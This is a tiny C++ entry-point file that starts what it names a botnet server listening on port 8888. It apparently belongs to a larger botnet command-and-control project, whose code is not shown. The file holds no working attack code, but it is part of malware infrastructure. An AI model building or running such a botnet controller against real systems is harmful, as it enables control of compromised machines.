#include "Server/BotnetServer.h"


int main(int argc, char* argv[]) {
	botnet::BotnetServer server(8888, 10, true);
	server.Start();

	return 0;
}